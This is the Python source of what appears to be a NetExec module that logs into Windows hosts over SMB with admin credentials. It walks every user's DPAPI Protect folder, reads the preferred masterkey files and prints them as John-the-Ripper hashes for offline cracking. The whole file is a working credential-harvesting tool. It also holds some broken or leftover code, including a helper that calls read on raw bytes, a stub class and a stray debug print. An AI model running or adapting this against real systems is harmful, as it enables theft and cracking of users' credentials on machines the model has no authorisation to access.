import ntpath
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
import struct
import binascii
import array

# Based on dpapimk2john, original work by @fist0urs


class Eater:
    def __init__(self, raw, offset=0, end=None, endianness="<"):
        self.raw = raw
        self.ofs = offset
        self.end = len(raw) if end is None else end
        self.endianness = endianness

    def prepare_fmt(self, fmt):
        if fmt[0] not in ("<", ">", "!", "@"):
            fmt = self.endianness + fmt
        return fmt, struct.calcsize(fmt)

    def read(self, fmt):
        fmt, sz = self.prepare_fmt(fmt)
        v = struct.unpack_from(fmt, self.raw, self.ofs)
        return v[0] if len(v) == 1 else v

    def eat(self, fmt):
        fmt, sz = self.prepare_fmt(fmt)
        v = struct.unpack_from(fmt, self.raw, self.ofs)
        self.ofs += sz
        return v[0] if len(v) == 1 else v

    def eat_string(self, length):
        return self.eat(f"{length}s")

    def remain(self):
        return self.raw[self.ofs:self.end]

    def eat_sub(self, length):
        sub = Eater(self.raw[self.ofs:self.ofs + length], endianness=self.endianness)
        self.ofs += length
        return sub


class DPAPIBlob:
    def __init__(self, raw=None):
        # Initialization code
        pass

    @staticmethod
    def hexstr(bytestr):
        return binascii.hexlify(bytestr).decode("ascii")


class CryptoAlgo:
    class Algo:
        def __init__(self, data):
            self.__dict__.update(data)

    _crypto_data = {}

    @classmethod
    def add_algo(cls, algnum, **kargs):
        cls._crypto_data[algnum] = cls.Algo(kargs)
        if "name" in kargs:
            kargs["ID"] = algnum
            cls._crypto_data[kargs["name"]] = cls.Algo(kargs)

    @classmethod
    def get_algo(cls, algnum):
        return cls._crypto_data.get(algnum)

    def __init__(self, algnum):
        self.algnum = algnum
        self.algo = CryptoAlgo.get_algo(algnum)
        if not self.algo:
            raise ValueError(f"Algorithm number {algnum} not found in crypto data")

    name = property(lambda self: self.algo.name)
    keyLength = property(lambda self: self.algo.keyLength // 8)
    ivLength = property(lambda self: self.algo.IVLength // 8)
    blockSize = property(lambda self: self.algo.blockLength // 8)
    digestLength = property(lambda self: self.algo.digestLength // 8)

    def __repr__(self):
        return f"{self.algo.name} [{self.algnum:#x}]"


def des_set_odd_parity(key):
    _lut = [1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14, 16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31, 32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47, 49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62, 64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79, 81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94, 97, 97, 98, 98, 100, 100, 103, 103, 104, 104, 107, 107, 109, 109, 110, 110, 112, 112, 115, 115, 117, 117, 118, 118, 121, 121, 122, 122, 124, 124, 127, 127, 128, 128, 131, 131, 133, 133, 134, 134, 137, 137, 138, 138, 140, 140, 143, 143, 145, 145, 146, 146, 148, 148, 151, 151, 152, 152, 155, 155, 157, 157, 158, 158, 161, 161, 162, 162, 164, 164, 167, 167, 168, 168, 171, 171, 173, 173, 174, 174, 176, 176, 179, 179, 181, 181, 182, 182, 185, 185, 186, 186, 188, 188, 191, 191, 193, 193, 194, 194, 196, 196, 199, 199, 200, 200, 203, 203, 205, 205, 206, 206, 208, 208, 211, 211, 213, 213, 214, 214, 217, 217, 218, 218, 220, 220, 223, 223, 224, 224, 227, 227, 229, 229, 230, 230, 233, 233, 234, 234, 236, 236, 239, 239, 241, 241, 242, 242, 244, 244, 247, 247, 248, 248, 251, 251, 253, 253, 254, 254]
    tmp = array.array("B")
    tmp.fromstring(key)
    for i, v in enumerate(tmp):
        tmp[i] = _lut[v]
    return tmp.tostring()


CryptoAlgo.add_algo(0x6601, name="DES", keyLength=64, IVLength=64, blockLength=64, keyFixup=des_set_odd_parity)
CryptoAlgo.add_algo(0x6603, name="DES3", keyLength=192, IVLength=64, blockLength=64, keyFixup=des_set_odd_parity)
CryptoAlgo.add_algo(0x6611, name="AES", keyLength=128, IVLength=128, blockLength=128)
CryptoAlgo.add_algo(0x660E, name="AES-128", keyLength=128, IVLength=128, blockLength=128)
CryptoAlgo.add_algo(0x660F, name="AES-192", keyLength=192, IVLength=128, blockLength=128)
CryptoAlgo.add_algo(0x6610, name="AES-256", keyLength=256, IVLength=128, blockLength=128)
CryptoAlgo.add_algo(0x8009, name="HMAC", digestLength=160, blockLength=512)
CryptoAlgo.add_algo(0x8003, name="md5", digestLength=128, blockLength=512)
CryptoAlgo.add_algo(0x8004, name="sha1", digestLength=160, blockLength=512)
CryptoAlgo.add_algo(0x800C, name="sha256", digestLength=256, blockLength=512)
CryptoAlgo.add_algo(0x800D, name="sha384", digestLength=384, blockLength=1024)
CryptoAlgo.add_algo(0x800E, name="sha512", digestLength=512, blockLength=1024)


def display_masterkey(Preferred):
    GUID1 = Preferred.read(8)
    GUID2 = Preferred.read(8)
    GUID = struct.unpack("<LHH", GUID1)
    GUID2 = struct.unpack(">HLH", GUID2)
    return f"{GUID[0]:08x}-{GUID[1]:04x}-{GUID[2]:04x}-{GUID2[0]:04x}-{GUID2[1]:08x}{GUID2[2]:04x}"


class MasterKey:
    def __init__(self, raw=None, SID=None, context=None):
        self.decrypted = self.key = self.key_hash = None
        self.hmacSalt = self.hmac = self.hmacComputed = None
        self.cipherAlgo = self.hashAlgo = self.rounds = None
        self.iv = self.version = self.ciphertext = None
        self.SID = SID
        self.context = context
        self.parse(raw)

    def parse(self, data):
        eater = Eater(data)
        self.version = eater.eat("L")
        self.iv = eater.eat("16s")
        self.rounds = eater.eat("L")
        self.hashAlgo = CryptoAlgo(eater.eat("L"))
        self.cipherAlgo = CryptoAlgo(eater.eat("L"))
        self.ciphertext = eater.remain()

    def jhash(self, user, ctx):
        version, hmac_algo, cipher_algo = -1, None, None
        if "des3" in str(self.cipherAlgo).lower() and "hmac" in str(self.hashAlgo).lower():
            version, hmac_algo, cipher_algo = 1, "sha1", "des3"
        elif "aes-256" in str(self.cipherAlgo).lower() and "sha512" in str(self.hashAlgo).lower():
            version, hmac_algo, cipher_algo = 2, "sha512", "aes256"
        else:
            return f"Unsupported combination of cipher '{self.cipherAlgo}' and hash algorithm '{self.hashAlgo}' found!"
        context = 0
        if self.context == "domain":
            context = 2
            s = f"{user}:$DPAPImk${version}*{context}*{self.SID}*{cipher_algo}*{hmac_algo}*{self.rounds}*{DPAPIBlob.hexstr(self.iv)}*{len(DPAPIBlob.hexstr(self.ciphertext))}*{DPAPIBlob.hexstr(self.ciphertext)}"
            ctx.log.highlight(f"Context2: {s}")
            context = 3
            s = f"\n{user}:$DPAPImk${version}*{context}*{self.SID}*{cipher_algo}*{hmac_algo}*{self.rounds}*{DPAPIBlob.hexstr(self.iv)}*{len(DPAPIBlob.hexstr(self.ciphertext))}*{DPAPIBlob.hexstr(self.ciphertext)}"
            ctx.log.highlight(f"Context3: {s}")
        else:
            context = {"local": 1, "domain1607-": 2, "domain1607+": 3}.get(self.context, 0)
            s = f"{user}:$DPAPImk${version}*{context}*{self.SID}*{cipher_algo}*{hmac_algo}*{self.rounds}*{DPAPIBlob.hexstr(self.iv)}*{len(DPAPIBlob.hexstr(self.ciphertext))}*{DPAPIBlob.hexstr(self.ciphertext)}"
        return s


class MasterKeyFile:
    def __init__(self, raw=None, SID=None, context=None):
        self.masterkey = self.backupkey = self.credhist = self.domainkey = None
        self.decrypted = False
        self.version = self.guid = self.policy = None
        self.masterkeyLen = self.backupkeyLen = self.credhistLen = self.domainkeyLen = 0
        self.SID = SID
        self.context = context
        self.parse(raw)

    def parse(self, data):
        eater = Eater(data)
        self.version = eater.eat("L")
        eater.eat("2L")
        self.guid = eater.eat("72s").decode("UTF-16LE").encode("utf-8")
        eater.eat("2L")
        self.policy = eater.eat("L")
        self.masterkeyLen = eater.eat("Q")
        self.backupkeyLen = eater.eat("Q")
        self.credhistLen = eater.eat("Q")
        self.domainkeyLen = eater.eat("Q")
        if self.masterkeyLen > 0:
            self.masterkey = MasterKey(eater.eat_sub(self.masterkeyLen).remain(), SID=self.SID, context=self.context)
        if self.backupkeyLen > 0:
            self.backupkey = MasterKey(eater.eat_sub(self.backupkeyLen).remain(), SID=self.SID, context=self.context)


class NXCModule:
    name = "dpapi_hash"
    description = "Remotely dump Dpapi hash based on masterkeys"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.false_positive = (
            ".",
            "..",
            "desktop.ini",
            "Public",
            "Default",
            "Default User",
            "All Users",
        )
        self.user_directories = "\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Protect"

    def get_users(self, conn):
        users = []

        users_dir_path = "Users\\*"
        directories = conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))

        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())  # noqa: PERF401, ignoring for readability
        return users

    def on_admin_login(self, context, connection):
        self.context = context
        self.connection = connection
        self.share = connection.args.share

        host = f"{connection.hostname}.{connection.domain}"
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            use_kcache=use_kcache,
        )

        conn = self.upgrade_connection(target=target, connection=connection.conn)
        # get users list
        users = self.get_users(conn)
        context.log.debug("Gathering DPAPI Hashes")

        # search user directory to retrieve the prefered protected Masterkey
        for user in users:
            directory_path = self.user_directories.format(username=user)
            directorylist = conn.remote_list_dir(self.context.share, directory_path)
            try:
                for item in directorylist:
                    if item.get_longname().startswith("S-"):
                        sid = item.get_longname()
                        print(f"on est quand même là {item}")
                        context.log.debug(f"Found user SID: {sid}")
                        mkfolder = ntpath.join(directory_path, item.get_longname())
                        mkfoldercontent = conn.remote_list_dir(self.context.share, mkfolder)
                        for mk in mkfoldercontent:
                            if mk.get_longname() == "Preferred":
                                preferredfile = ntpath.join(directory_path, mkfolder, mk.get_longname())
                                Preferredcontent = conn.readFile(self.context.share, preferredfile)
                                GUID1, GUID2 = Preferredcontent[:8], Preferredcontent[8:16]
                                GUID = struct.unpack("<LHH", GUID1)
                                GUID2 = struct.unpack(">HLH", GUID2)
                                masterkey = f"{GUID[0]:08x}-{GUID[1]:04x}-{GUID[2]:04x}-{GUID2[0]:04x}-{GUID2[1]:08x}{GUID2[2]:04x}"
                                masterkeypath = ntpath.join(directory_path, mkfolder, masterkey)
                                masterkeycontent = conn.readFile(self.context.share, masterkeypath)
                                masterkeyfile_obj = MasterKeyFile(masterkeycontent, SID=sid, context="domain")
                                if masterkeyfile_obj.masterkey:
                                    masterkeyfile_obj.masterkey.jhash(user, context)
            except Exception as e:
                context.log.debug(f"{e}")
                continue

    def upgrade_connection(self, target: Target, connection=None):
        conn = DPLootSMBConnection(target)
        if connection is not None:
            conn.smb_session = connection
        else:
            conn.connect()
        return conn

    def options(self, context, module_options):
        """ """